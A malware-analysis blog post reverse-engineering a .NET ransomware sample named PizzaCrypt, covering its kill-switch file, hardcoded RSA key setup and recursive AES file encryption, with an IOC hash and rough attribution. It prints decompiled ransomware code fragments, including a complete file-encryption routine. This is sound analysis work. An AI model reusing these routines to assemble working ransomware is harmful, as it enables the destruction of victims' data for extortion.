---
title: "PizzaCrypt Analysis"
date: 2022-09-07T16:07:44-04:00
draft: false 
summary: "A quick analysis of some fun .NET ransomware with a goofy ransom note."
tags: ["malware", "ransomware", ".NET", "RE"]
---

## Background

I was scrolling through twitter when I saw this post from [@siri_urz](https://twitter.com/siri_urz): 

{{< twitter user=siri_urz id=1567498038435880961 >}}

As a fan of goofy ransomware, I couldn’t resist looking at this. Obviously this isn't some sick APT malware but I've been meaning to write-up more stuff and this seemed like a good exercise. It's a non-obfuscated .NET application so the "RE" process should be pretty quick! I've included the [binary]() and all [decompiled source](https://github.com/ald3ns/PizzaCryptAnalysis/blob/main/Decompiled/1/Program.cs) on my GitHub. 

In 2019 another ransomware program *PizzaCrypt**s***[^1] did the rounds, but this appears to be unrelated.  

## Technical Analysis

Examining `Main` the first thing that stands out is a kill-switch, which checks for the presence of `"C:\\protect.dat"` and will cease execution if found. 

```csharp
bool flag = File.Exists("C:\\protect.dat");
if (flag) {
	Application.Exit();
	Process.GetCurrentProcess().Kill();
	Thread.Sleep(-1);
}
```

We then proceed onto another flag check, this time confirming if `g` is supplied as an argument. In that case it will set the global variables`Program.PersonalID` and `Program.KeyHash` to the values stored in `piz.za` and `pi.zza` respectively. 

```csharp
bool flag2 = args.Length != 0 && args[0] == "g";
if (flag2) {
	Program.PersonalID = File.ReadAllBytes(
		                 Path.Combine(
						 Environment.GetFolderPath(
						 Environment.SpecialFolder.ApplicationData), "piz.za"));

	Program.KeyHash = File.ReadAllBytes(
					  Path.Combine(
					  Environment.GetFolderPath(
					  Environment.SpecialFolder.ApplicationData), "pi.zza"));
}
```

Then we get to the meat of the ransomware, the encryption/decryption routine. It's realtively simple and makes use of a hardcoded key. This is presumably becuase the operator has the private key and will use that to decrypt in the end. It is important to note that no new key is actually generated here. 

```csharp
byte[] key = Program.GenerateSalt(64);
GCHandle gchandle = GCHandle.Alloc(key, GCHandleType.Pinned);
using (RSACryptoServiceProvider rsacryptoServiceProvider = new RSACryptoServiceProvider())
{
	rsacryptoServiceProvider.ImportParameters(new RSAParameters
	{
		Modulus = Convert.FromBase64String(
			"8AacrrnhQdq6IGyOxFlSptFtMmo8VmdX64TZg4Yha3LLHSVinmuV6XXnVEPzJhCI7r7VAOERAEaj/xopNcnmGzRKhK4myQQbaPujznLlBvWZHDrlS8HDNwhB/vNr+m95k+ZntXpuFo/9g8VsKi3SWHVT4kr4HVokzpdWHZtfCQk="), 
		Exponent = Convert.FromBase64String("AQAB") // 65537
	});
	Program.PersonalID = rsacryptoServiceProvider.Encrypt(key, false);
	Program.KeyHash = SHA256.Create().ComputeHash(key);
}
```

After the RSA object has been setup, it writes to those files we talked about earlier which store this specific instance's keys.

```csharp
Program.EncryptAll(array);
Program.ZeroMemory(gchandle.AddrOfPinnedObject(), array.Length);
gchandle.Free();
File.WriteAllBytes(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "piz.za"), Program.PersonalID);
File.WriteAllBytes(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "pi.zza"), Program.KeyHash);
Process.Start(Application.ExecutablePath, "g");
```

Lastly, we see the actual encryption routine. It recurses through the file system and encrypts each file using the key set above. It also adds the `.pizza` extension to all the files that it encrypted. 

```csharp
private static void EncryptFile(string file, byte[] password)
		{
			using (FileStream fileStream = new FileStream(file + ".pizza", FileMode.Create))
			{
				using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
				{
					byte[] array = Program.GenerateSalt(32);
					fileStream.Write(array, 0, array.Length);
					Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(password, array, 3);
					rijndaelManaged.KeySize = 256;
					rijndaelManaged.BlockSize = 128;
					rijndaelManaged.Padding = PaddingMode.PKCS7;
					rijndaelManaged.Mode = CipherMode.CFB;
					rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
					rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
					using (CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
					{
						using (FileStream fileStream2 = new FileStream(file, FileMode.Open))
						{
							byte[] array2 = new byte[10485760];
							int count;
							while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
							{
								cryptoStream.Write(array2, 0, count);
							}
						}
					}
				}
			}
		}
```

The decryption routine for this program is exactly the same but makes use of the private key. Overall, there really isn't much to this ransomware.

## Where did this sample come from?

One of the strings that really sticks out in this binary is the source path: "C:\\Users\\Костя\\source\\repos\\". After searching for other submissions that might feature the same info, we come across some very interesting [results](https://www.virustotal.com/gui/search/%2522C%253A%255C%255CUsers%255C%255C%25D0%259A%25D0%25BE%25D1%2581%25D1%2582%25D1%258F%255C%255Csource%255C%255Crepos%255C%255C%2522/files). We can see that this build path is found in quite a few other samples:

- EliteVirusGenerator.exe
- Crapsomware.exe
- not a viruz.exe
- /freecsgodownloadnovirus/freecsgodownloadnovirus.github.io/main/csgo.exe

These all seem like they were written in jest, which tracks with PizzaCrypt. There really isn't any major concern here - was mostly just an interesting exercise in quick and dirty RE with some rough attribution.

## IOCs

| File Name | SHA256                                                       |
| --------- | ------------------------------------------------------------ |
| 1.exe     | a0aafb46fcdbc528925dea8783fa348bb1df49fa4ff216136f32d708d7605b6f |

## References

[^1]: https://minerva-labs.com/blog/did-someone-order-pizzacrypts/
